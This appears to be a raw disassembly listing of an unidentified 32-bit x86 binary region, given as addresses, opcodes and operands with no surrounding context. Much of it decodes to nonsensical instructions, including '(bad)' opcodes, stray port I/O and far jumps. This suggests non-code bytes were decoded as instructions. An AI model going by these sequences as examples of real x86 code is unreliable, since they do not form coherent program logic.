  42fbde:	xor    bh,BYTE PTR [edi+0x1d]
  42fbe1:	out    0xfb,al
  42fbe3:	in     al,0xfd
  42fbe5:	loop   0x42fbea
  42fbe7:	out    dx,eax
  42fbe8:	fsub   st,st(2)
  42fbea:	xchg   DWORD PTR [ecx+eiz*4+0x48],edi
  42fbee:	push   esp
  42fbef:	jno    0x42fb9b
  42fbf1:	shl    BYTE PTR ds:0xd70818f2,cl
  42fbf7:	mov    esp,0x76b02b11
  42fbfc:	int3   
  42fbfd:	sub    edx,DWORD PTR [ebp+0x2f]
  42fc00:	(bad)  
  42fc01:	mov    edi,0xe06dbbdf
  42fc06:	adc    dl,BYTE PTR [ebx+0x52]
  42fc09:	mov    cl,0x3c
  42fc0b:	push   eax
  42fc0c:	mov    bh,0x83
  42fc0e:	mov    ebp,esi
  42fc10:	jle    0x42fbe3
  42fc12:	sub    DWORD PTR [ecx-0x27],ebp
  42fc15:	fs pop eax
  42fc17:	pop    esi
  42fc18:	sub    ah,BYTE PTR [esp+eiz*2-0x6e4422c9]
  42fc1f:	sub    ah,bh
  42fc21:	mov    dl,0x44
  42fc23:	push   ds
  42fc24:	shr    ecx,1
  42fc26:	cs jg  0x42fbef
  42fc29:	fstp   DWORD PTR [esi+0x28]
  42fc2c:	xchg   ebp,eax
  42fc2d:	out    dx,al
  42fc2e:	mov    edx,0x423d4c2c
  42fc33:	lahf   
  42fc34:	ror    DWORD PTR [esi+0x7],cl
  42fc37:	into   
  42fc38:	pop    ebp
  42fc39:	rcl    cl,cl
  42fc3b:	cmp    DWORD PTR [esi+0x68],0x5acfdb1b
  42fc42:	mov    bh,0x68
  42fc44:	lea    ebp,[ebp-0x7]
  42fc47:	xor    edx,ebp
  42fc49:	mov    ecx,?
  42fc4b:	inc    ebp
  42fc4c:	daa    
  42fc4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fc4e:	rol    BYTE PTR [edx+0x18],1
  42fc51:	fdiv   QWORD PTR [eax-0x7490dbcb]
  42fc57:	xchg   DWORD PTR [ebx],esp
  42fc59:	mov    esi,0x4b489a8e
  42fc5e:	addr16 pop ds
  42fc60:	mov    cl,0x90
  42fc62:	and    esi,DWORD PTR [esi+edi*8+0x500bcd68]
  42fc69:	test   BYTE PTR [ebx],al
  42fc6b:	popa   
  42fc6c:	cmp    al,BYTE PTR [eax]
	...
  42fcd6:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fcdc:	mov    ebx,0x36325e9a
  42fce1:	and    BYTE PTR [esi-0x5],cl
  42fce4:	mov    edi,esp
  42fce6:	inc    DWORD PTR ds:[ecx]
  42fce9:	add    bh,bh
  42fceb:	add    BYTE PTR [eax],al
  42fced:	add    BYTE PTR [edi],al
  42fcef:	in     eax,dx
  42fcf0:	lds    ebp,FWORD PTR [eax+esi*1+0x42743a23]
  42fcf7:	inc    eax
  42fcf8:	cmp    edx,edx
  42fcfa:	and    eax,0xa2b39a74
  42fcff:	dec    eax
  42fd00:	xchg   esp,eax
  42fd01:	and    ebx,esi
  42fd03:	outs   dx,DWORD PTR ds:[esi]
  42fd04:	cmp    eax,0xcbf9e7b9
  42fd09:	jle    0x42fc90
  42fd0b:	popa   
  42fd0c:	push   edx
  42fd0d:	mov    esp,0x9b0175ef
  42fd12:	shl    BYTE PTR ds:0x771b8744,1
  42fd18:	stos   BYTE PTR es:[edi],al
  42fd19:	sub    BYTE PTR [ebx+0x50afb740],0xbc
  42fd20:	lock sahf 
  42fd22:	call   0x88f0996b
  42fd27:	adc    al,0x27
  42fd29:	dec    eax
  42fd2a:	add    ebp,DWORD PTR [edx+0x5]
  42fd2d:	xchg   esp,eax
  42fd2e:	mov    esp,0xbf0e838
  42fd33:	jmp    0x6da0c0ea
  42fd38:	int    0xa7
  42fd3a:	mov    ebp,0x452121d7
  42fd3f:	sti    
  42fd40:	adc    al,0x34
  42fd42:	mov    esi,0x708689e
  42fd47:	cdq    
  42fd48:	stc    
  42fd49:	inc    edi
  42fd4a:	outs   dx,BYTE PTR ds:[esi]
  42fd4b:	mov    ecx,0x7b312d5f
  42fd50:	xchg   BYTE PTR [esi],dh
  42fd52:	sbb    eax,0xa19da69f
  42fd57:	sub    BYTE PTR [edi+0x40bfe059],ch
  42fd5d:	mov    WORD PTR [esp+ebx*8-0x6e],fs
  42fd61:	mov    ah,0x9f
  42fd63:	sti    
  42fd64:	or     BYTE PTR [edi],0xd4
  42fd67:	jg     0x42fd19
  42fd69:	lods   al,BYTE PTR ds:[esi]
  42fd6a:	inc    eax
  42fd6b:	(bad)  
  42fd6c:	aad    0xdb
  42fd6e:	dec    ebx
  42fd6f:	sbb    al,0x24
  42fd72:	bound  esi,QWORD PTR [ebx+0x31]
  42fd75:	xor    esp,DWORD PTR [ebx-0x14]
  42fd78:	js     0x42fd5a
  42fd7a:	popa   
  42fd7b:	in     al,0xde
  42fd7d:	sahf   
  42fd7e:	(bad)  
  42fd7f:	jne    0x42fdbb
  42fd81:	clc    
  42fd82:	stc    
  42fd83:	xchg   ebp,eax
  42fd84:	(bad)  
  42fd85:	cli    
  42fd86:	xor    al,0x62
  42fd88:	add    BYTE PTR [eax+0x6b0c6cff],bh
  42fd8e:	cs inc ebp
  42fd90:	ret    0x7df8
  42fd93:	sub    ebx,DWORD PTR [esi+0x22]
  42fd96:	mov    esi,eax
  42fd98:	xchg   ebx,eax
  42fd99:	jmp    0x42fd2b
  42fd9b:	xchg   esi,eax
  42fd9c:	pop    edx
  42fd9d:	ret    
  42fd9e:	mov    dl,0x88
  42fda0:	add    DWORD PTR [esi],ebx
  42fda2:	shl    DWORD PTR [ebx],cl
  42fda4:	jmp    FWORD PTR [ebx+0x3b]
  42fda7:	adc    edx,edi
  42fda9:	loopne 0x42fd3b
  42fdab:	add    dl,BYTE PTR [eax]
  42fdad:	mov    fs,edx
  42fdaf:	sbb    al,0x50
  42fdb1:	pop    ss
  42fdb2:	fisttp DWORD PTR [ebx-0x54]
  42fdb5:	sahf   
  42fdb6:	push   0x2189f2e7
  42fdbb:	add    eax,0xe55a6d3c
  42fdc0:	dec    edx
  42fdc1:	mov    cs,WORD PTR [ebp+0x5d]
  42fdc4:	(bad)  [esi+ebp*2+0x42b3e7c]
  42fdcb:	add    ch,BYTE PTR [eax-0x5b]
  42fdce:	xor    BYTE PTR [di],dl
  42fdd1:	loop   0x42fe4c
  42fdd3:	in     al,0xf3
  42fdd5:	or     ecx,eax
  42fdd7:	ss scas eax,DWORD PTR es:[edi]
  42fdd9:	je     0x42fdae
  42fddb:	and    ecx,eax
  42fddd:	jmp    0x44156938
  42fde2:	pushf  
  42fde3:	pusha  
  42fde4:	js     0x42fd9c
  42fde6:	stos   BYTE PTR es:[edi],al
  42fde7:	xchg   esi,eax
  42fde8:	sbb    bl,dl
  42fdea:	mov    ds:0x266a,eax
	...
  42fe53:	add    BYTE PTR [eax],al
  42fe55:	add    BYTE PTR [eax-0x40],cl
  42fe58:	ret    0xcaf0
  42fe5b:	bnd jp 0x42fe56
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz es ret 0xb0cc
  42fe66:	cmp    eax,0xff000200
  42fe6b:	add    BYTE PTR [eax],al
  42fe6d:	add    BYTE PTR [esi-0x4ac54509],cl
  42fe73:	inc    edi
  42fe74:	fwait
  42fe75:	and    edx,DWORD PTR [edi]
  42fe77:	jb     0x42fe13
  42fe79:	jb     0x42fe33
  42fe7b:	jo     0x42fe58
  42fe7d:	neg    bh
  42fe7f:	mov    cl,0x9a
  42fe81:	push   0x51
  42fe83:	ins    BYTE PTR es:[edi],dx
  42fe84:	pop    ecx
  42fe85:	mov    dl,0xfd
  42fe87:	lahf   
  42fe88:	and    BYTE PTR [edx-0x3f],dl
  42fe8b:	mov    edi,0xc4d1ba19
  42fe91:	lods   al,BYTE PTR ds:[esi]
  42fe92:	mov    ds:0x5d165ca4,al
  42fe97:	paddq  mm1,QWORD PTR [esi+edx*4-0xb]
  42fe9c:	sahf   
  42fe9d:	jbe    0x42feec
  42fe9f:	aam    0xf1
  42fea1:	in     al,0x76
  42fea3:	dec    edi
  42fea4:	sub    bl,BYTE PTR [ecx]
  42fea6:	scas   al,BYTE PTR es:[edi]
  42fea7:	mov    WORD PTR [edi+0x3810148f],ss
  42fead:	(bad)  
  42feae:	bound  eax,QWORD PTR [esi-0x3b378d82]
  42feb4:	mov    ch,0x2
  42feb6:	shr    BYTE PTR [esi+0x53],1
  42feb9:	jg     0x42fea5
  42febb:	jb     0x42ff1d
  42febd:	pop    edi
  42febe:	sbb    esp,DWORD PTR [edx+ebx*8-0x1d]
  42fec2:	ret    0x2a08
  42fec5:	pop    es
  42fec6:	sbb    al,0xf1
  42fec8:	inc    esp
  42fec9:	ret    0x2b04
  42fecc:	sahf   
  42fecd:	pop    esp
  42fece:	scas   eax,DWORD PTR es:[edi]
  42fecf:	test   al,0xb1
  42fed1:	add    ebp,DWORD PTR [ecx]
  42fed3:	fisttp WORD PTR [edx]
  42fed5:	cmp    DWORD PTR [eax+0x458279e1],ecx
  42fedb:	(bad)  
  42fedc:	int    0x1c
  42fede:	xchg   esp,eax
  42fedf:	mov    ebx,0xf6a9d705
  42fee4:	dec    ebp
  42fee5:	shr    DWORD PTR [ebp+0x28],0xb5
  42fee9:	mov    al,0xac
  42feeb:	ret    0x73e8
  42feee:	jl     0x42fe8c
  42fef0:	movq   QWORD PTR [eax+0x731a5e23],mm7
  42fef7:	jecxz  0x42ff76
  42fef9:	add    eax,0xf4d9f3eb
  42fefe:	push   0x5c
  42ff00:	ins    BYTE PTR es:[edi],dx
  42ff01:	push   cs
  42ff02:	cli    
  42ff03:	mov    gs,eax
  42ff05:	or     eax,0xe6c1b8f
  42ff0a:	ret    
  42ff0b:	fs jo  0x42ff31
  42ff0e:	push   0x61
  42ff10:	(bad)  
  42ff11:	pop    ss
  42ff12:	retf   0xca5e
  42ff15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ff16:	das    
  42ff17:	ins    DWORD PTR es:[edi],dx
  42ff18:	rol    BYTE PTR [esi],1
  42ff1a:	mov    al,ds:0x842e39b0
  42ff1f:	push   esp
  42ff20:	xor    BYTE PTR [edx],ch
  42ff22:	jb     0x42ff38
  42ff24:	inc    eax
  42ff25:	mov    dh,0xd8
  42ff27:	xor    al,0x37
  42ff29:	jmp    0x66213435
  42ff2e:	sbb    BYTE PTR [ebx-0x35],ah
  42ff31:	or     ch,ah
  42ff33:	mov    edx,0x67ff1af6
  42ff38:	xchg   DWORD PTR ds:0x3a93e644,ebp
  42ff3e:	ins    BYTE PTR es:[edi],dx
  42ff3f:	push   edi
  42ff40:	xor    edi,DWORD PTR [eax-0x438e6c2e]
  42ff46:	retf   0x87bc
  42ff49:	inc    eax
  42ff4a:	loop   0x42ff6e
  42ff4c:	int3   
  42ff4d:	sub    al,0x1a
  42ff4f:	and    al,BYTE PTR [esi+0x15]
  42ff52:	add    al,0x44
  42ff55:	or     ebp,DWORD PTR [edi-0x1bde09ef]
  42ff5b:	inc    ebp
  42ff5c:	dec    edx
  42ff5d:	ds add ah,ch
  42ff60:	mov    cl,0x5a
  42ff62:	pushf  
  42ff63:	xor    ch,bh
  42ff65:	dec    ebp
  42ff66:	pop    eax
  42ff67:	dec    esi
  42ff68:	js     0x42ff13
  42ff6a:	pop    ds
  42ff6b:	xor    dh,BYTE PTR [eax+0x0]
	...
  42ffd5:	add    BYTE PTR [edi+eiz*2],al
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [ebx+esi*2+0x41],0x88
  42ffe5:	and    DWORD PTR [ecx+eax*1],edi
  42ffe8:	add    al,BYTE PTR [eax]
  42ffea:	inc    DWORD PTR [eax]
  42ffec:	add    BYTE PTR [eax],al
  42ffee:	push   cs
  42ffef:	mov    esi,0x3d1d95b
  42fff4:	aas    
  42fff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fff6:	fisubr DWORD PTR [esp+edi*2]
  42fff9:	adc    eax,0x9a96f8ff
  42fffe:	fldenv [eax]
  430000:	dec    eax
  430001:	jo     0x42ffee
  430003:	inc    ebp
  430004:	xchg   edi,eax
  430005:	jl     0x430072
  430007:	pop    ecx
  430008:	sbb    dl,BYTE PTR [edx+0x4a]
  43000b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43000c:	mov    bh,BYTE PTR ds:0xe7890dc0
  430012:	push   0x72
  430014:	mov    ch,0xea
  430016:	adc    ax,0x689a
  43001a:	jl     0x42ffbc
  43001c:	pop    edi
  43001d:	push   edi
  43001e:	sti    
  43001f:	xchg   ebp,eax
  430020:	inc    ebp
  430021:	out    dx,eax
  430022:	jno    0x43004e
  430024:	stc    
  430025:	loopne 0x43003a
  430027:	lock leave 
  430029:	xchg   edi,eax
  43002a:	jmp    0x397f:0x738536e6
  430031:	mov    ds,WORD PTR [ebx-0x37a0c8ca]
  430037:	lahf   
  430038:	sub    eax,esi
  43003a:	xor    ch,BYTE PTR [edi+ecx*2-0x36]
  43003e:	cmp    bh,BYTE PTR [esi-0x2105c9bb]
  430044:	aas    
  430045:	cmp    al,0xa5
  430047:	cmp    eax,0xe7fec510
  43004c:	(bad)  
  43004d:	jbe    0x42ffd7
  43004f:	retf   0xe44f
  430052:	or     eax,0xfaaf1484
  430057:	jmp    0x3cda:0x7463532
  43005e:	dec    ecx
  43005f:	test   DWORD PTR [esi+edi*4-0x2bfd863e],esp
  430066:	dec    ebx
  430067:	sbb    esp,edx
  430069:	add    eax,0x970bbb62
  43006e:	or     al,0xd2
  430070:	mov    edi,0x88d1af5
  430075:	xor    DWORD PTR [edx+0x3284f3d],0xffffffc7
  43007c:	je     0x430054
  43007e:	xchg   esp,eax
  43007f:	daa    
  430080:	sub    DWORD PTR [edx+eiz*2-0x2462e4af],edi
  430087:	fadd   st,st(2)
  430089:	mov    edi,ebp
  43008b:	xchg   DWORD PTR [edi-0x65],eax
  43008e:	ins    BYTE PTR es:[edi],dx
  43008f:	addr16 jns 0x43005c
  430092:	add    al,0x72
  430094:	div    DWORD PTR [edi]
  430096:	out    0x13,eax
  430098:	ss call 0x4f969d0e
  43009e:	xor    dl,BYTE PTR [edi-0x46]
  4300a1:	sar    BYTE PTR [edi],1
  4300a3:	test   BYTE PTR [edx],0xef
  4300a6:	dec    edx
  4300a7:	xchg   esp,eax
  4300a8:	inc    ebp
  4300a9:	mov    ebx,0x279ddb5a
  4300ae:	push   ebx
  4300af:	leave  
  4300b0:	push   es
  4300b1:	mov    gs,WORD PTR [ecx+eax*1+0x4e]
  4300b5:	stos   DWORD PTR es:[edi],eax
  4300b6:	pusha  
  4300b7:	bound  edi,QWORD PTR [ebp+0x53]
  4300ba:	fwait
  4300bb:	out    dx,eax
  4300bc:	mov    ecx,0x99dcc0c4
  4300c1:	js     0x430079
  4300c3:	stos   BYTE PTR es:[edi],al
  4300c4:	or     ch,bl
  4300c6:	in     eax,0xe4
  4300c8:	cmp    ah,BYTE PTR cs:[ecx]
  4300cb:	sub    BYTE PTR [edx-0x35259065],dh
  4300d1:	sbb    esp,DWORD PTR [edi+0x32787e38]
  4300d7:	(bad)  
  4300d8:	pop    ss
  4300d9:	ja     0x4300bf
  4300db:	jb     0x430146
  4300dd:	cmp    BYTE PTR [edx-0x52426e0],0xab
  4300e4:	leave  
  4300e5:	push   0xfffffff8
  4300e7:	mov    bl,0x4c
  4300e9:	mov    al,0xb
  4300eb:	bound  eax,QWORD PTR [ebp+0x0]
	...
  430156:	(bad)  
  430157:	ins    DWORD PTR es:[edi],dx
  430158:	aam    0xb5
  43015a:	(bad)  
  43015b:	mov    ebp,0x9547fe7
  430160:	scas   eax,DWORD PTR es:[edi]
  430161:	add    al,0xe1
  430163:	arpl   WORD PTR [eax-0x6a],sp
  430166:	cmp    eax,DWORD PTR [edx]
  430168:	add    al,BYTE PTR [eax]
  43016a:	add    BYTE PTR gs:[eax],al
  43016d:	add    BYTE PTR [ebx+0x7d626b0b],cl
  430173:	and    BYTE PTR ds:0x8141ad6a,bl
  430179:	jb     0x4301c7
  43017b:	adc    eax,0x5eaf3c8a
  430180:	and    DWORD PTR [esi+0x4eb96de8],ebp
  430186:	push   ebp
  430187:	jae    0x430187
  430189:	in     al,dx
  43018a:	cmp    edi,DWORD PTR [ecx]
  43018c:	stc    
  43018d:	cmp    BYTE PTR [esi],al
  43018f:	inc    ecx
  430190:	jp     0x4301ed
  430192:	push   edx
  430193:	stos   DWORD PTR es:[edi],eax
  430194:	mov    ebx,0x9cfea655
  430199:	loope  0x4301a9
  43019b:	addr16 dec eax
  43019d:	fwait
  43019e:	adc    ebx,edx
  4301a0:	jb     0x430147
  4301a2:	imul   edi,ebx,0x96371f0b
  4301a8:	ins    BYTE PTR es:[edi],dx
  4301a9:	sbb    al,0x1b
  4301ab:	or     ah,BYTE PTR [edi-0x16]
  4301ae:	in     al,dx
  4301af:	lds    ecx,FWORD PTR [edi]
  4301b1:	sub    eax,0xde2e1d55
  4301b6:	dec    DWORD PTR [esi]
  4301b8:	add    ecx,esi
  4301ba:	into   
  4301bb:	icebp  
  4301bc:	jge    0x430174
  4301be:	push   ebp
  4301bf:	cmp    dh,BYTE PTR [ebx]
  4301c1:	pop    eax
  4301c2:	or     DWORD PTR [eax+0x29],edi
  4301c5:	xlat   BYTE PTR ds:[ebx]
  4301c6:	xor    BYTE PTR [ecx+0x18],bh
  4301c9:	push   ds
  4301ca:	in     eax,0x98
  4301cc:	fdivr  st(2),st
  4301ce:	add    edx,DWORD PTR [ebx]
  4301d0:	into   
  4301d1:	inc    edx
  4301d2:	test   BYTE PTR [eax],0x0
  4301d5:	add    BYTE PTR [ebp+0x55],cl
  4301d8:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  4301de:	mov    esp,ebp
  4301e0:	or     al,ah
  4301e2:	dec    ebp
  4301e3:	add    bh,al
  4301e5:	add    BYTE PTR [eax],cl
  4301e7:	add    BYTE PTR [eax],al
  4301e9:	mov    DWORD PTR [eax],0x3ff44545
  4301ef:	xor    DWORD PTR [eax],eax
  4301f1:	test   DWORD PTR [ebx-0x34070b64],ecx
  4301f7:	(bad)  
  4301f8:	enter  0x4d45,0xb8
  4301fc:	mov    esi,DWORD PTR [edx]
  4301fe:	hlt    
  4301ff:	test   ebx,ecx
  430201:	pushf  
  430202:	enter  0x4df8,0x8b
  430206:	mov    DWORD PTR [ebp+0x8],0x894708
  43020d:	inc    ebp
  43020e:	mov    ebp,0xff8bfffc
  430213:	dec    ebp
  430214:	mov    ch,0xf4
  430216:	call   DWORD PTR [ebx-0x1]
  430219:	mov    ebx,0x8005426
  43021e:	call   DWORD PTR [ecx+0x8]
  430221:	pop    es
  430222:	jmp    0xb8:0x9cb4533
  430229:	fwait
  43022a:	mov    esi,DWORD PTR [edx-0xc]
  43022d:	xor    al,bl
  43022f:	add    BYTE PTR [ebx+0x3c83203],bl
  430235:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  43023b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430241:	xor    eax,DWORD PTR [eax]
  430243:	retf   
  430244:	ret    
  430245:	add    eax,esi
  430247:	enter  0x8945,0x64
  43024b:	dec    ebp
  43024c:	sbb    ah,cl
  43024e:	add    BYTE PTR [ebx-0xb87b277],cl
  430254:	dec    DWORD PTR [ebx-0xbcfb275]
  43025a:	test   DWORD PTR [ebx],esi
  43025c:	dec    ebx
  43025e:	inc    DWORD PTR [ebx]
  430260:	inc    eax
  430261:	enter  0x8989,0x64
  430265:	(bad)  
  430266:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43026a:	cld    
  43026b:	dec    DWORD PTR [ebp-0xa90001]
  430271:	push   edi
  430272:	mov    BYTE PTR [edx+0x1],ch
  430275:	and    DWORD PTR [eax],eax
  430277:	pop    ecx
  430278:	inc    ebp
  430279:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43027f:	push   0xffffff89
  430281:	pop    ecx
  430282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430283:	dec    ebp
  430284:	add    BYTE PTR [ecx+0x45fc088b],cl
  43028a:	jne    0x4302d5
  43028c:	lea    eax,[eax]
  43028e:	fs (bad) 
  430290:	dec    DWORD PTR [eax]
  430292:	mov    DWORD PTR [eax],eax
  430294:	test   al,0x0
  430296:	add    BYTE PTR [ebp-0x18],cl
  430299:	xor    ebp,DWORD PTR [edx]
  43029b:	add    eax,DWORD PTR [eax]
  43029d:	mov    eax,eax
  43029f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302a6:	inc    ebp
  4302a7:	mov    DWORD PTR [ebx+0x459408],ecx
  4302ad:	bound  ecx,QWORD PTR [ebx-0x372749b]
  4302b3:	inc    eax
  4302b4:	cmp    bh,0x1
  4302b7:	lea    eax,[eax]
  4302b9:	and    BYTE PTR [eax],al
  4302bb:	inc    DWORD PTR [ecx-0x18]
  4302be:	mov    ecx,DWORD PTR [ebx]
  4302c0:	cld    
  4302c1:	add    BYTE PTR [ecx+0x75014d],cl
  4302c7:	(bad)  
  4302c8:	xchg   ebp,eax
  4302c9:	sar    bh,1
  4302cb:	inc    eax
  4302cc:	inc    DWORD PTR [eax]
  4302ce:	mov    eax,DWORD PTR [ebp-0x4]
  4302d1:	xor    edx,DWORD PTR [edx+0x7201be]
  4302d7:	add    BYTE PTR [edx],dl
  4302d9:	(bad)  
  4302da:	nop
  4302db:	inc    ebp
  4302dc:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4302e2:	mov    al,0xff
  4302e4:	add    bh,bh
  4302e6:	add    BYTE PTR [ebx],dh
  4302e8:	inc    DWORD PTR [ebx]
  4302ea:	sbb    al,0x89
  4302ec:	jne    0x4302ca
  4302ee:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4302f4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4302fa:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430301:	inc    DWORD PTR [ebp-0x75]
  430304:	fisttp QWORD PTR [esi+ebp*8]
  430307:	test   DWORD PTR [esi-0x1],esp
  43030a:	inc    ebp
  43030b:	(bad)  
  43030c:	aas    
  43030d:	inc    ebp
  43030e:	(bad)  
  43030f:	lea    edi,[eax+edi*2-0x1]
  430313:	inc    edi
  430315:	mov    DWORD PTR ds:0x8000c7a0,edi
  43031b:	mov    ebp,esp
  43031d:	cld    
  43031e:	loop   0x4302ad
  430320:	inc    ebp
  430321:	(bad)  
  430322:	out    dx,al
  430323:	(bad)  
  430324:	fisttp WORD PTR [eax+0x8801c7]
  43032a:	jecxz  0x430371
  43032c:	in     al,dx
  43032d:	inc    DWORD PTR [ebp-0x4]
  430330:	out    0x8d,eax
  430332:	aas    
  430333:	(bad)  
  430334:	call   0xcb2e38
  430339:	add    DWORD PTR [ebx-0x7f490400],ecx
  43033f:	add    BYTE PTR [ecx],al
  430341:	test   DWORD PTR [eax],eax
  430343:	wrmsr  
  430345:	ja     0x430342
  430347:	add    BYTE PTR [eax],al
  430349:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43034f:	add    esp,edi
  430351:	add    BYTE PTR [eax+0x450108],al
  430357:	mov    edi,DWORD PTR [ebp-0x6c]
  43035a:	add    DWORD PTR [eax],0x4
  43035d:	mov    eax,DWORD PTR [ebp+0x3]
  430360:	mov    edi,DWORD PTR [esp+edi*8]
  430363:	dec    ebp
  430364:	nop
  430365:	mov    eax,DWORD PTR [ecx]
  430367:	fadd   DWORD PTR [eax]
  430369:	add    BYTE PTR [ecx*4-0xafa000],dl
  430370:	inc    ebp
  430371:	push   edx
  430372:	call   DWORD PTR [ebp-0x7b]
  430375:	mov    esi,DWORD PTR [ebp-0x74]
  430378:	mov    eax,DWORD PTR [eax]
  43037a:	cld    
  43037b:	mov    eax,DWORD PTR [eax+0x880103]
  430381:	add    BYTE PTR [ebp+0x6a],bh
  430384:	cmp    edi,0x10
  430387:	mov    WORD PTR [ebp+0x0],es
  43038a:	mov    edx,DWORD PTR [edx-0x4]
  43038d:	push   ecx
  43038e:	nop
  43038f:	inc    DWORD PTR [ecx]
  430391:	cld    
  430392:	add    BYTE PTR [ebp-0x16],bh
  430395:	mov    eax,DWORD PTR [eax]
  430397:	cld    
  430398:	push   eax
  430399:	nop
  43039a:	inc    ebp
  43039b:	add    edi,edi
  43039d:	add    BYTE PTR [ebx+0x4de2f445],cl
  4303a3:	jmp    0xe33b:0x9403c733
  4303aa:	movntq QWORD PTR [edx],mm7
  4303ad:	mov    DWORD PTR [eax],0xb87e8b98
  4303b3:	test   ebx,eax
  4303b5:	jmp    DWORD PTR [ebp-0x1]
  4303b8:	int    0xed
  4303ba:	sub    esp,esi
  4303bc:	add    eax,DWORD PTR [ebp-0x30]
  4303bf:	fild   WORD PTR [ebp+0x3f]
  4303c2:	cmp    eax,edi
  4303c4:	je     0xc043e9ea
  4303ca:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4303d1:	(bad)  
  4303d2:	jne    0x430360
  4303d4:	mov    ebx,ebp
  4303d6:	cld    
  4303d7:	jle    0x43041e
  4303d9:	dec    ecx
  4303da:	mov    eax,DWORD PTR [eax]
  4303dc:	mov    ah,0x50
  4303de:	add    BYTE PTR [ebp-0x18],al
  4303e1:	mov    ebp,DWORD PTR [ecx]
  4303e3:	test   al,0x0
  4303e5:	add    BYTE PTR [ebx-0x7f170301],cl
  4303eb:	add    DWORD PTR es:[eax],eax
  4303ee:	add    al,al
  4303f0:	xor    BYTE PTR [eax+0x4f],dl
  4303f3:	inc    ebp
  4303f4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4303fa:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430400:	add    DWORD PTR [ecx+0x458be845],ecx
  430406:	fmul   DWORD PTR [ebx+0x8bb800]
  43040c:	cld    
  43040d:	call   0xd82ed2
  430412:	dec    DWORD PTR [ebx+0x109ee8ff]
  430418:	add    al,al
  43041a:	push   eax
  43041b:	es inc ebp
  43041d:	inc    ebp
  43041e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430424:	dec    DWORD PTR [ebx-0x3ff70301]
  43042a:	mov    DWORD PTR gs:[eax],eax
  43042d:	call   0x8c134967
  430432:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  430439:	sub    eax,ebx
  43043b:	add    BYTE PTR [eax],al
  43043d:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  430443:	inc    ebp
  430444:	push   ebp
  430445:	mov    ebp,eax
  430447:	shr    BYTE PTR [ecx],1
  430449:	ret    
  43044a:	add    dh,al
  43044c:	mov    eax,ecx
  43044e:	cld    
  43044f:	test   BYTE PTR [eax+0x101],al
  430455:	inc    ebp
  430456:	xor    BYTE PTR [ebx],dh
  430458:	push   edi
  430459:	mov    ecx,0xffe48d89
  43045e:	inc    ebp
  43045f:	enter  0x4d8b,0xfc
  430463:	mov    eax,ebx
  430465:	or     BYTE PTR [ebx+0x38732c1],bl
  43046b:	add    DWORD PTR [ebp-0xbac000],ecx
  430471:	add    al,ch
  430473:	add    BYTE PTR [ecx],ch
  430475:	inc    DWORD PTR [eax]
  430477:	cld    
  430478:	mov    edi,DWORD PTR [ebp-0xc]
  43047b:	mov    esi,DWORD PTR [ebp-0x4]
  43047e:	xor    edx,DWORD PTR [eax+0x8d0103]
  430484:	and    BYTE PTR [ebp+0x50e800ff],bl
  43048a:	sub    DWORD PTR [ebp+0x0],eax
  43048d:	mov    edi,edi
  43048f:	test   al,0xe4
  430491:	add    BYTE PTR [ebp-0x1],cl
  430494:	xor    ebp,eax
  430496:	add    esp,DWORD PTR [esi]
  430498:	cmp    eax,DWORD PTR [eax]
  43049a:	jne    0x4304e9
  43049c:	(bad)  
  43049d:	mov    ebx,eax
  43049f:	pushf  
  4304a0:	add    BYTE PTR [eax],al
  4304a2:	add    BYTE PTR [ecx-0x37474bb],cl
  4304a8:	or     BYTE PTR [eax+0x8401c3],bh
  4304ae:	fwait
  4304af:	jne    0x4304e3
  4304b1:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  4304b7:	inc    DWORD PTR [ebp-0x74d68b18]
  4304bd:	add    BYTE PTR [eax+0x33fc4d8b],bh
  4304c3:	or     BYTE PTR [ebp+0x72000801],0x30
  4304ca:	add    BYTE PTR [edi+0x45],dl
  4304cd:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  4304d4:	gs test ebp,ecx
  4304d7:	je     0x430504
  4304d9:	mov    eax,DWORD PTR [ebx]
  4304db:	cld    
  4304dc:	sar    BYTE PTR [eax+0x3b0145],1
  4304e2:	pcmpeqw mm4,mm2
  4304e5:	xor    edi,edi
  4304e7:	lea    ecx,[ebx-0x23927470]
  4304ed:	add    BYTE PTR [ebp+0x50],cl
  4304f0:	cmp    eax,DWORD PTR [ebp+0x75]
  4304f3:	mov    ebp,DWORD PTR [eax-0x68]
  4304f6:	test   DWORD PTR [eax],eax
  4304f8:	clc    
  4304f9:	push   DWORD PTR [ebp-0x1]
  4304fc:	lea    ecx,[eax]
  4304fe:	int3   
  4304ff:	inc    ebp
  430500:	call   0xfb3690
  430505:	jne    0x4304ff
  430507:	xor    edi,DWORD PTR [ebp-0x41]
  43050a:	jmp    0x43057e
  43050c:	mov    eax,DWORD PTR [eax]
  43050e:	mov    eax,0x339545c7
  430513:	inc    DWORD PTR [ebx]
  430515:	push   DWORD PTR [ecx]
  430517:	inc    ecx
  430518:	mov    eax,DWORD PTR [eax]
  43051a:	jmp    0x43056c
  43051c:	mov    eax,DWORD PTR [ebp-0x3c]
  43051f:	mov    eax,eax
  430521:	cld    
  430522:	clc    
